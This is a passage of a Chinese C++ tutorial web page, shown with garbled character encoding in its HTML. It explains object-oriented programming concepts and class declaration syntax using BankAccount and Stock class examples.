href="#é¢å‘å¯¹è±¡ç¼–ç¨‹-Object-Oriented-Programming-OOP" class="headerlink" title="é¢å‘å¯¹è±¡ç¼–ç¨‹ (Object-Oriented Programming - OOP)"></a>é¢å‘å¯¹è±¡ç¼–ç¨‹ (Object-Oriented Programming - OOP)</h3><p>é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰æ˜¯ä¸€ç§ä¸åŒçš„æ€è€ƒæ–¹å¼ã€‚å®ƒå°†ç¨‹åºçœ‹ä½œæ˜¯ç”±ç›¸äº’äº¤äº’çš„<strong>å¯¹è±¡ (Objects)</strong> ç»„æˆçš„ã€‚</p><ul><li>  <strong>å…³æ³¨ç‚¹ï¼š</strong> ä¸»è¦å…³æ³¨ç‚¹åœ¨äº<strong>æ•°æ®</strong>ä»¥åŠä¸æ•°æ®ç›¸å…³çš„<strong>æ“ä½œ</strong>ã€‚ç¨‹åºçš„æ ¸å¿ƒæ˜¯å¯¹è±¡ã€‚</li><li>  <strong>å¯¹è±¡ï¼š</strong> å¯¹è±¡æ˜¯ç°å®ä¸–ç•Œå®ä½“çš„æŠ½è±¡ï¼Œå®ƒ<strong>å°è£… (Encapsulates)</strong> äº†<strong>æ•°æ®ï¼ˆå±æ€§/çŠ¶æ€ï¼‰</strong>å’Œå¯ä»¥å¯¹è¿™äº›æ•°æ®æ‰§è¡Œçš„<strong>æ“ä½œï¼ˆæ–¹æ³•/è¡Œä¸ºï¼‰</strong>ã€‚</li><li>  <strong>ç»„ç»‡æ–¹å¼ï¼š</strong> ç¨‹åºé€šè¿‡åˆ›å»ºå¯¹è±¡å¹¶è®©è¿™äº›å¯¹è±¡ç›¸äº’å‘é€æ¶ˆæ¯ï¼ˆè°ƒç”¨æ–¹æ³•ï¼‰æ¥ç»„ç»‡ã€‚</li><li><strong>æ ¸å¿ƒæ¦‚å¿µï¼š</strong><ul><li>  <strong>å°è£… (Encapsulation):</strong> å°†æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°æ†ç»‘åœ¨ä¸€èµ·ï¼ˆå½¢æˆç±»ï¼‰ï¼Œå¹¶å¯¹å¤–éƒ¨éšè—å¯¹è±¡çš„å†…éƒ¨å®ç°ç»†èŠ‚ï¼ˆæ•°æ®éšè—ï¼‰ã€‚</li><li>  <strong>ç»§æ‰¿ (Inheritance):</strong> å…è®¸åˆ›å»ºä¸€ä¸ªæ–°ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ï¼Œè¯¥ç±»ç»§æ‰¿ç°æœ‰ç±»ï¼ˆåŸºç±»ï¼‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œä»è€Œå®ç°ä»£ç é‡ç”¨å’Œå±‚æ¬¡ç»“æ„ã€‚</li><li>  <strong>å¤šæ€ (Polymorphism):</strong> å…è®¸ä¸åŒç±»çš„å¯¹è±¡å¯¹ç›¸åŒçš„æ¶ˆæ¯ï¼ˆæ–¹æ³•è°ƒç”¨ï¼‰åšå‡ºä¸åŒçš„å“åº”ã€‚è¿™é€šå¸¸é€šè¿‡è™šå‡½æ•°å®ç°ã€‚</li><li>  <strong>æŠ½è±¡ (Abstraction):</strong> å…³æ³¨å¯¹è±¡çš„æœ¬è´¨ç‰¹å¾ï¼Œå¿½ç•¥ä¸é‡è¦çš„ç»†èŠ‚ã€‚ç±»å°±æ˜¯ä¸€ç§æŠ½è±¡ã€‚</li></ul></li><li>  <strong>ç¤ºä¾‹è¯­è¨€ï¼š</strong> C++, Java, C#, Python, Smalltalkã€‚</li></ul><p><strong>é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ€ç»´æ–¹å¼ï¼š</strong> â€œç¨‹åºæ¶‰åŠå“ªäº›â€˜äº‹ç‰©â€™ï¼ˆå¯¹è±¡ï¼‰ï¼Ÿæ¯ä¸ªâ€˜äº‹ç‰©â€™æœ‰å“ªäº›ç‰¹å¾ï¼ˆæ•°æ®ï¼‰ï¼Ÿå®ƒå¯ä»¥åšä»€ä¹ˆï¼ˆæ–¹æ³•ï¼‰ï¼Ÿè¿™äº›â€˜äº‹ç‰©â€™ä¹‹é—´å¦‚ä½•äº¤äº’ï¼Ÿâ€</p><p><strong>ä¾‹å­ï¼ˆæ¦‚å¿µæ€§ï¼‰ï¼š</strong><br>å¯¹äºé“¶è¡Œè´¦æˆ·ï¼ŒOOPæ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ª <code>BankAccount</code> <strong>ç±»</strong>ï¼š</p><ul><li>  <strong>æ•°æ®æˆå‘˜ï¼ˆå±æ€§ï¼‰ï¼š</strong> <code>accountNumber</code>, <code>balance</code> (é€šå¸¸è®¾ä¸ºç§æœ‰ <code>private</code>ï¼Œä»¥å®ç°æ•°æ®éšè—)ã€‚</li><li>  <strong>æˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ï¼š</strong> <code>deposit(amount)</code>, <code>withdraw(amount)</code>, <code>check_balance()</code> (è¿™äº›å‡½æ•°ç›´æ¥æ“ä½œå¯¹è±¡å†…éƒ¨çš„æ•°æ®)ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ ç¤ºä¾‹ (é¢å‘å¯¹è±¡)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BankAccount</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// æ•°æ®éšè—</span></span><br><span class="line">    <span class="keyword">int</span> accountNumber;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// å…¬å…±æ¥å£</span></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•° (ç”¨äºåˆ›å»ºå¯¹è±¡)</span></span><br><span class="line">    BankAccount(<span class="keyword">int</span> accNum, <span class="keyword">double</span> initialBalance) &#123;</span><br><span class="line">        accountNumber = accNum;</span><br><span class="line">        balance = (initialBalance &gt;= <span class="number">0</span>) ? initialBalance : <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            balance += amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span> &amp;&amp; balance &gt;= amount) &#123;</span><br><span class="line">            balance -= amount;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å¤„ç†é”™è¯¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> check_balance() <span class="keyword">const</span> &#123; <span class="comment">// const è¡¨ç¤ºæ­¤æ–¹æ³•ä¸ä¿®æ”¹å¯¹è±¡çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAccountNumber</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;; <span class="comment">// æ³¨æ„ç±»å®šä¹‰æœ«å°¾çš„åˆ†å·</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»º BankAccount å¯¹è±¡</span></span><br><span class="line">    <span class="function">BankAccount <span class="title">myAccount</span><span class="params">(<span class="number">12345</span>, <span class="number">1000.0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡å¯¹è±¡è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">    myAccount.deposit(<span class="number">500.0</span>);</span><br><span class="line">    myAccount.withdraw(<span class="number">200.0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: &quot;</span> &lt;&lt; myAccount.check_balance() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œæ•°æ® (<code>accountNumber</code>, <code>balance</code>) å’Œæ“ä½œ (<code>deposit</code>, <code>withdraw</code>, <code>check_balance</code>) è¢«ç´§å¯†åœ°æ†ç»‘åœ¨ <code>BankAccount</code> ç±»ä¸­ã€‚ä½ é€šè¿‡ <code>myAccount</code> è¿™ä¸ªå¯¹è±¡æ¥è°ƒç”¨å®ƒçš„æ–¹æ³•ã€‚</p><h3 id="æ€»ç»“å¯¹æ¯”"><a href="#æ€»ç»“å¯¹æ¯”" class="headerlink" title="æ€»ç»“å¯¹æ¯”"></a>æ€»ç»“å¯¹æ¯”</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è¿‡ç¨‹æ€§ç¼–ç¨‹</th><th align="left">é¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP)</th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒ</strong></td><td align="left">å‡½æ•°/è¿‡ç¨‹</td><td align="left">å¯¹è±¡ (æ•°æ® + æ–¹æ³•)</td></tr><tr><td align="left"><strong>æ•°æ®</strong></td><td align="left">é€šå¸¸ä¸å‡½æ•°åˆ†ç¦»</td><td align="left">å°è£…åœ¨å¯¹è±¡å†…éƒ¨</td></tr><tr><td align="left"><strong>è®¿é—®æ§åˆ¶</strong></td><td align="left">æœ‰é™ (ä¸»è¦é ä½œç”¨åŸŸ)</td><td align="left">å¼º (public, private, protected)</td></tr><tr><td align="left"><strong>ä¸»è¦ä¼˜åŠ¿</strong></td><td align="left">ç®€å•ç›´æ¥ï¼Œé€‚åˆå°å‹æˆ–ä¸­å‹é¡¹ç›®</td><td align="left">æ¨¡å—åŒ–ã€é‡ç”¨æ€§ã€å¯ç»´æŠ¤æ€§ã€æ‰©å±•æ€§å¥½</td></tr><tr><td align="left"><strong>è®¾è®¡æ–¹æ³•</strong></td><td align="left">è‡ªé¡¶å‘ä¸‹ (Top-down)</td><td align="left">è‡ªåº•å‘ä¸Š (Bottom-up) æˆ–æ··åˆ</td></tr><tr><td align="left"><strong>ä»£ç é‡ç”¨</strong></td><td align="left">ä¸»è¦é€šè¿‡å‡½æ•°åº“</td><td align="left">ä¸»è¦é€šè¿‡ç»§æ‰¿å’Œç»„åˆ</td></tr><tr><td align="left"><strong>é€‚åˆåœºæ™¯</strong></td><td align="left">ç®—æ³•å¯†é›†å‹ã€é¡ºåºæ‰§è¡Œä»»åŠ¡</td><td align="left">å¤§å‹å¤æ‚ç³»ç»Ÿã€æ¨¡æ‹Ÿã€GUI</td></tr></tbody></table><p>C++ æœ€åˆæ˜¯ä» C è¯­è¨€å‘å±•è€Œæ¥çš„ï¼Œå› æ­¤å®ƒå®Œå…¨å…¼å®¹è¿‡ç¨‹æ€§ç¼–ç¨‹ã€‚ç„¶è€Œï¼ŒC++ çš„çœŸæ­£å¨åŠ›åœ¨äºå…¶å¼ºå¤§çš„é¢å‘å¯¹è±¡ç‰¹æ€§ï¼Œå®ƒå…è®¸å¼€å‘è€…æ„å»ºæ›´å¤§å‹ã€æ›´å¤æ‚ã€æ›´æ˜“äºç»´æŠ¤å’Œæ‰©å±•çš„è½¯ä»¶ç³»ç»Ÿã€‚æ¥ä¸‹æ¥çš„ç« èŠ‚å°†æ·±å…¥æ¢è®¨ OOP çš„æ ¸å¿ƒâ€”â€”ç±»å’Œå¯¹è±¡ã€‚</p><h2 id="10-2-æŠ½è±¡å’Œç±»"><a href="#10-2-æŠ½è±¡å’Œç±»" class="headerlink" title="10.2 æŠ½è±¡å’Œç±»"></a>10.2 æŠ½è±¡å’Œç±»</h2><p>é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„æ ¸å¿ƒæ€æƒ³ä¹‹ä¸€æ˜¯**æŠ½è±¡ (Abstraction)**ã€‚åœ¨ç¼–ç¨‹ä¸­ï¼ŒæŠ½è±¡æ„å‘³ç€å…³æ³¨äº‹ç‰©çš„æœ¬è´¨ç‰¹å¾å’Œè¡Œä¸ºï¼Œè€Œå¿½ç•¥å…¶ä¸é‡è¦çš„å†…éƒ¨ç»†èŠ‚ã€‚æˆ‘ä»¬æ¯å¤©éƒ½åœ¨ä½¿ç”¨æŠ½è±¡ï¼šå½“ä½ å¼€è½¦æ—¶ï¼Œä½ åªéœ€è¦çŸ¥é“å¦‚ä½•ä½¿ç”¨æ–¹å‘ç›˜ã€æ²¹é—¨å’Œåˆ¹è½¦ï¼ˆæ¥å£ï¼‰ï¼Œè€Œä¸éœ€è¦äº†è§£å¼•æ“å†…éƒ¨å¤æ‚çš„æœºæ¢°åŸç†ï¼ˆå®ç°ç»†èŠ‚ï¼‰ã€‚</p><h3 id="10-2-1-ç±»å‹æ˜¯ä»€ä¹ˆ"><a href="#10-2-1-ç±»å‹æ˜¯ä»€ä¹ˆ" class="headerlink" title="10.2.1 ç±»å‹æ˜¯ä»€ä¹ˆ"></a>10.2.1 ç±»å‹æ˜¯ä»€ä¹ˆ</h3><p>åœ¨ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œâ€œç±»å‹â€ï¼ˆTypeï¼‰å®šä¹‰äº†ä¸€ç»„å¯èƒ½çš„å€¼ä»¥åŠå¯ä»¥å¯¹è¿™äº›å€¼æ‰§è¡Œçš„æ“ä½œã€‚</p><ul><li>  <strong>å†…ç½®ç±»å‹ (Built-in Types):</strong> C++ æä¾›äº†åƒ <code>int</code>, <code>float</code>, <code>char</code>, <code>bool</code> è¿™æ ·çš„åŸºæœ¬ç±»å‹ã€‚æˆ‘ä»¬çŸ¥é“ <code>int</code> å¯ä»¥å­˜å‚¨æ•´æ•°ï¼Œå¹¶ä¸”å¯ä»¥å¯¹å®ƒä»¬æ‰§è¡ŒåŠ ã€å‡ã€ä¹˜ã€é™¤ç­‰è¿ç®—ã€‚ç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•è¡¨ç¤ºè¿™äº›ç±»å‹çš„æ•°æ®ä»¥åŠå¦‚ä½•æ‰§è¡Œè¿™äº›æ“ä½œã€‚</li><li>  <strong>ç”¨æˆ·å®šä¹‰ç±»å‹ (User-Defined Types - UDT):</strong> C++ å…è®¸ç¨‹åºå‘˜åˆ›å»ºè‡ªå·±çš„ç±»å‹æ¥æ¨¡æ‹Ÿç°å®ä¸–ç•Œæˆ–ç‰¹å®šé—®é¢˜åŸŸä¸­çš„æ¦‚å¿µã€‚è¿™å°±æ˜¯<strong>ç±» (Class)</strong> å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚ç±»æ˜¯ä¸€ç§å°†æ•°æ®ï¼ˆå±æ€§ï¼‰å’Œæ“ä½œè¿™äº›æ•°æ®çš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ†ç»‘åœ¨ä¸€èµ·çš„æœºåˆ¶ï¼Œä»è€Œåˆ›å»ºæ–°çš„æ•°æ®ç±»å‹ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ç¼–å†™ä¸€ä¸ªè‚¡ç¥¨äº¤æ˜“ç¨‹åºï¼Œä½ å¯èƒ½éœ€è¦ä¸€ä¸ªè¡¨ç¤ºâ€œè‚¡ç¥¨â€çš„ç±»å‹ã€‚è¿™ä¸ªç±»å‹åº”è¯¥åŒ…å«å“ªäº›æ•°æ®ï¼ˆå¦‚è‚¡ç¥¨åç§°ã€æŒæœ‰æ•°é‡ã€å•ä»·ï¼‰ï¼Ÿå¯ä»¥å¯¹å®ƒæ‰§è¡Œå“ªäº›æ“ä½œï¼ˆå¦‚è´­ä¹°ã€å‡ºå”®ã€æ›´æ–°ä»·æ ¼ã€æ˜¾ç¤ºä¿¡æ¯ï¼‰ï¼Ÿç±»å…è®¸ä½ ç²¾ç¡®åœ°å®šä¹‰è¿™äº›ã€‚</p><h3 id="10-2-2-C-ä¸­çš„ç±»"><a href="#10-2-2-C-ä¸­çš„ç±»" class="headerlink" title="10.2.2 C++ä¸­çš„ç±»"></a>10.2.2 C++ä¸­çš„ç±»</h3><p>ç±»æ˜¯åˆ›å»ºå¯¹è±¡çš„è“å›¾æˆ–æ¨¡æ¿ã€‚å®ƒå®šä¹‰äº†ï¼š</p><ol><li> <strong>æ•°æ®æˆå‘˜ (Data Members):</strong> å¯¹è±¡å°†å­˜å‚¨çš„æ•°æ®ï¼ˆä¹Ÿç§°ä¸ºå±æ€§ã€çŠ¶æ€ï¼‰ã€‚</li><li> <strong>æˆå‘˜å‡½æ•° (Member Functions):</strong> å¯ä»¥å¯¹å¯¹è±¡çš„æ•°æ®æ‰§è¡Œçš„æ“ä½œï¼ˆä¹Ÿç§°ä¸ºæ–¹æ³•ã€è¡Œä¸ºï¼‰ã€‚</li></ol><p><strong>ç±»å£°æ˜çš„åŸºæœ¬è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ç§æœ‰æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="comment">// é€šå¸¸å°†æ•°æ®æˆå‘˜æ”¾åœ¨è¿™é‡Œï¼Œå®ç°æ•°æ®éšè—</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// å…¬æœ‰æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="comment">// è¿™æ˜¯ç±»çš„å…¬å…±æ¥å£ï¼Œå¤–éƒ¨ä»£ç é€šè¿‡å®ƒä»¬ä¸å¯¹è±¡äº¤äº’</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="comment">// ä¿æŠ¤æˆå‘˜ (å°†åœ¨ç»§æ‰¿ä¸­è®¨è®º)</span></span><br><span class="line">&#125;; <span class="comment">// æ³¨æ„æœ«å°¾çš„åˆ†å·</span></span><br></pre></td></tr></table></figure><ul><li>  <strong><code>class</code> å…³é”®å­—:</strong> è¡¨æ˜ä½ æ­£åœ¨å®šä¹‰ä¸€ä¸ªç±»ã€‚</li><li>  <strong><code>ClassName</code>:</strong> ä½ ä¸ºæ–°ç±»å‹æŒ‡å®šçš„åç§°ï¼ˆéµå¾ªå˜é‡å‘½åè§„åˆ™ï¼Œé€šå¸¸é¦–å­—æ¯å¤§å†™ï¼‰ã€‚</li><li><strong>è®¿é—®è¯´æ˜ç¬¦ (Access Specifiers):</strong><ul><li>  <code>private</code>: ç§æœ‰æˆå‘˜åªèƒ½è¢«<strong>ç±»çš„å†…éƒ¨æˆå‘˜å‡½æ•°</strong>è®¿é—®ã€‚è¿™æ˜¯å®ç°<strong>æ•°æ®éšè— (Data Hiding)</strong> çš„å…³é”®ï¼Œä¿æŠ¤æ•°æ®ä¸è¢«å¤–éƒ¨ä»£ç éšæ„ä¿®æ”¹ï¼Œæ˜¯å°è£…çš„é‡è¦ä½“ç°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç±»æˆå‘˜æ˜¯ <code>private</code> çš„ã€‚</li><li>  <code>public</code>: å…¬æœ‰æˆå‘˜å¯ä»¥è¢«ç¨‹åºä¸­çš„<strong>ä»»ä½•åœ°æ–¹</strong>è®¿é—®ï¼ˆé€šè¿‡ç±»çš„å¯¹è±¡ï¼‰ã€‚å®ƒä»¬æ„æˆäº†ç±»çš„**å…¬å…±æ¥å£ (Public Interface)**ã€‚</li><li>  <code>protected</code>: ä¸ç»§æ‰¿ç›¸å…³ï¼Œç°åœ¨å¯ä»¥æš‚æ—¶å°†å…¶è§†ä¸ºä¸ <code>private</code> ç±»ä¼¼ã€‚</li></ul></li><li>  <strong>æˆå‘˜:</strong> ç±»å®šä¹‰çš„èŠ±æ‹¬å· <code>&#123;&#125;</code> å†…éƒ¨å£°æ˜çš„å˜é‡ï¼ˆæ•°æ®æˆå‘˜ï¼‰å’Œå‡½æ•°ï¼ˆæˆå‘˜å‡½æ•°ï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªç®€å•çš„ <code>Stock</code> ç±»</strong></p><p>å‡è®¾æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè‚¡ç¥¨æŒæœ‰çš„ç±»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šå¸¸æ”¾åœ¨å¤´æ–‡ä»¶ (e.g., stock.h) ä¸­</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // ä¸ºäº†ä½¿ç”¨ std::string</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// æ•°æ®æˆå‘˜é€šå¸¸æ˜¯ç§æœ‰çš„</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="comment">// ä¸€ä¸ªç§æœ‰è¾…åŠ©å‡½æ•°ï¼Œåªèƒ½åœ¨ç±»å†…éƒ¨è°ƒç”¨</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// æˆå‘˜å‡½æ•°é€šå¸¸æ˜¯å…¬æœ‰çš„ï¼Œæ„æˆæ¥å£</span></span><br><span class="line">    <span class="comment">// å‡½æ•°åŸå‹ (å£°æ˜)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr)</span></span>; <span class="comment">// ä¹°å…¥è‚¡ç¥¨</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;                      <span class="comment">// å¢æŒè‚¡ç¥¨</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;                     <span class="comment">// å–å‡ºè‚¡ç¥¨</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;                             <span class="comment">// æ›´æ–°è‚¡ä»·</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// æ˜¾ç¤ºè‚¡ç¥¨ä¿¡æ¯ (constè¡¨æ˜æ­¤å‡½æ•°ä¸ä¿®æ”¹å¯¹è±¡)</span></span><br><span class="line">&#125;; <span class="comment">// ç±»å®šä¹‰ç»“æŸ</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª <code>Stock</code> ç±»å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ•°æ®ç±»å‹ã€‚å®ƒå°è£…äº†è‚¡ç¥¨ç›¸å…³çš„æ•°æ® (<code>company</code>, <code>shares</code>, <code>share_val</code>, <code>total_val</code>) å’Œæ“ä½œè¿™äº›æ•°æ®çš„å‡½æ•° (<code>acquire</code>, <code>buy</code>, <code>sell</code>, <code>update</code>, <code>show</code>)ã€‚æ•°æ®æˆå‘˜è¢«è®¾ä¸º <code>private</code>ï¼Œå¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥è®¿é—®å®ƒä»¬ï¼Œåªèƒ½é€šè¿‡ <code>public</code> çš„æˆå‘˜å‡½æ•°æ¥äº¤äº’ã€‚<code>set_tot()</code> æ˜¯ä¸€ä¸ªå†…éƒ¨è¾…åŠ©å‡½æ•°ï¼Œä¹Ÿè¢«è®¾ä¸º <code>private</code>ã€‚</p><h3 id="10-2-3-å®ç°ç±»æˆå‘˜å‡½æ•°"><a href="#10-2-3-å®ç°ç±»æˆå‘˜å‡½æ•°" class="headerlink" title="10.2.3 å®ç°ç±»æˆå‘˜å‡½æ•°"></a>10.2.3 å®ç°ç±»æˆå‘˜å‡½æ•°</h3><p>ç±»å®šä¹‰é€šå¸¸åªåŒ…å«æˆå‘˜å‡½æ•°çš„<strong>å£°æ˜ï¼ˆåŸå‹ï¼‰</strong>ã€‚å‡½æ•°çš„<strong>å®šä¹‰ï¼ˆå®ç°ï¼‰</strong>å¯ä»¥æ”¾åœ¨ç±»å£°æ˜çš„å†…éƒ¨ï¼ˆå¦‚æœå‡½æ•°å¾ˆç®€å•ï¼Œå¯ä»¥ä½œä¸ºå†…è”å‡½æ•°ï¼‰ï¼Œæˆ–è€…æ›´å¸¸è§åœ°ï¼Œæ”¾åœ¨ç±»å£°æ˜çš„å¤–éƒ¨ï¼ˆé€šå¸¸åœ¨å¯¹åº”çš„æºæ–‡ä»¶ <code>.cpp</code> ä¸­ï¼‰ã€‚</p><p>å½“åœ¨ç±»å¤–éƒ¨å®šä¹‰æˆå‘˜å‡½æ•°æ—¶ï¼Œä½ éœ€è¦ä½¿ç”¨<strong>ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code></strong> æ¥æŒ‡æ˜è¿™ä¸ªå‡½æ•°å±äºå“ªä¸ªç±»ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ReturnType <span class="title">ClassName::FunctionName</span><span class="params">(ParameterList)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šå®ç° <code>Stock</code> ç±»çš„æˆå‘˜å‡½æ•°</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 